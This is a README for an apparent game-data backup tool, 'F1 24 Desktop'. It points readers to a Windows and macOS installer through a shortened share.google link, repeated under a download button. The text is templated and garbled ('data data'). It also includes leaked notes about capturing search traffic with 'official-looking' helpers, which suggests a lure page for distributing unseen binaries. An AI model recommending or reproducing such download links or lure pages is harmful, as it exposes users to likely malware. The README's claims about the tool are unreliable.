![F1 24 Desktop](assets/hero.png)

# F1 24 Desktop

*Dated copies of F1 24 data data, nothing uploaded.*

## Overview

This repository is **F1 24 Desktop**, a desktop helper. Dated copies of F1 24 data data, nothing uploaded.

Patches move F1 24 data paths without warning.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Locates F1 24 user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for F1 24 is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/h-ramos1880/f1-24-desktop

MIT license. See `LICENSE`.
